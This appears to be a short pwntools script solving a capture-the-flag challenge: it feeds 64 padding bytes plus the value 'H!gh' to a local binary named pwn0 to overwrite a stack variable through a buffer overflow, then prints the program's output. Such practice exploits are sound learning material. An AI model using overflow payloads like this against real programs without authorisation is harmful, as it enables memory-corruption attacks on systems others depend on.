from multiprocessing import process
from pwn import *

garbage = 'A' * 64 + 'H!gh'
p=process('./pwn0')
p.sendline(garbage)
msgout=p.recvall()
print('Output: ', msgout)
